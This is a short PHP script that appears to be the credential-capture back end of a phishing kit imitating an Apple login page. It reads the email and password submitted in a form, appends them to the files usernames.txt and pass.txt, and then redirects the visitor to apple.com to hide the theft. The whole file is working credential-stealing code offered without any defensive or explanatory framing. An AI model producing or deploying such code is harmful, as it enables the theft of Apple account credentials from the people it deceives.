<?php

file_put_contents("usernames.txt", "Apple Usernames : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Apple Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.apple.com/');
?>
